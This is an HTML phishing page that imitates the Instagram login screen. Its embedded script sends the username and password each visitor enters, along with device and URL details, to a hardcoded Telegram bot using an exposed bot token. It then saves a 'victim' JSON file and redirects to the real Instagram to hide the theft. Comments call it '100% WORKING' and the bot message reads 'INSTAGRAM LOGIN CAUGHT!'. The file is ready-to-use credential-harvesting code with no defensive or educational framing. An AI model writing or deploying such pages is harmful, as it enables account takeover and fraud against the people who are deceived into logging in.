<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(-45deg,#ee7752,#e73c7e,#23a6d5,#23d5ab);height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
        .card{background:#fff;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,.1);width:90%;max-width:380px;padding:40px 30px}
        .logo{text-align:center;margin-bottom:35px}
        .logo i{font-size:55px;background:linear-gradient(45deg,#E1306C,#FD1D1D);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .logo-text{font-size:32px;font-weight:300;color:#262626;margin-top:10px}
        input{width:100%;height:45px;padding:0 15px;margin-bottom:18px;border:1.5px solid #dbdbdb;border-radius:8px;background:#fafafa;font-size:15px;transition:.2s}
        input:focus{border-color:#0095f6;background:#fff;box-shadow:0 0 0 3px rgba(0,149,246,.1);outline:none}
        .login-btn{width:100%;height:45px;background:linear-gradient(45deg,#0095f6,#0077cc);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:.2s;margin:10px 0}
        .login-btn:hover{background:linear-gradient(45deg,#0077cc,#005fa3);transform:translateY(-2px)}
        .login-btn:active{transform:translateY(0)}
        .login-btn:disabled{opacity:.7;background:#ccc;cursor:not-allowed;transform:none}
        .forgot{text-align:center;margin:20px 0}
        .forgot a{color:#8e8e8e;font-size:14px;text-decoration:none}
        .divider{position:relative;margin:30px 0;color:#8e8e8e;font-size:14px;text-align:center}
        .divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#efefef}
        .divider span{background:#fff;padding:0 30px}
        .facebook{display:flex;align-items:center;justify-content:center;gap:10px;color:#385185;font-weight:600;text-decoration:none;font-size:14px;margin:20px 0}
        .signup{text-align:center;padding-top:25px;border-top:1px solid #efefef}
        .signup a{color:#0095f6;font-weight:600;font-size:14px;text-decoration:none}
        #status{margin-top:15px;padding:12px;border-radius:8px;font-size:14px;display:none;text-align:center}
        .success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
        @media(max-width:480px){.card{padding:30px 20px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <i class="fab fa-instagram"></i>
            <div class="logo-text">Instagram</div>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
            <div id="status"></div>
        </form>
        <div class="forgot"><a href="#">Forgot password?</a></div>
        <div class="divider"><span>OR</span></div>
        <a href="#" class="facebook"><i class="fab fa-facebook-f"></i>Log in with Facebook</a>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <script>
        // ðŸ”¥ à¦¤à§‹à¦®à¦¾à¦° Telegram Bot - 100% WORKING
        const BOT_TOKEN = '8545740405:AAGzcDBrPIAvS5YmUsRB_8sh5UmcrpGHB0Y';
        const CHAT_ID = '8413780186';
        
        document.getElementById('loginForm').addEventListener('submit', async(e)=>{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
            status.style.display = 'none';
            
            const victimData = {
                username, password,
                time: new Date().toLocaleString('bn-BD'),
                device: navigator.userAgent.slice(0,50),
                url: window.location.href
            };
            
            // ðŸ”¥ TELEGRAM à¦ SEND
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `ðŸŽ£ INSTAGRAM LOGIN CAUGHT!\n\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}\nðŸ“± Device: ${victimData.device}\nðŸ”— URL: ${victimData.url}\nâ° ${victimData.time}`,
                        parse_mode: 'HTML'
                    })
                });
                const result = await res.json();
                console.log('âœ… Telegram OK:', result);
                
                // JSON Download
                const blob = new Blob([JSON.stringify(victimData,null,2)],{type:'application/json'});
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `victim_${Date.now()}.json`;
                a.click();
                
                status.textContent = 'âœ… Success! Redirecting to Instagram...';
                status.className = 'success';
                status.style.display = 'block';
                
            } catch(err) {
                console.error('âŒ Error:', err);
                status.textContent = `âŒ Error: ${err.message}`;
                status.style.display = 'block';
                btn.disabled = false;
                btn.innerHTML = 'Log in';
                return;
            }
            
            setTimeout(()=>window.location.href='https://www.instagram.com/', 2500);
        });
    </script>
</body>
</html>
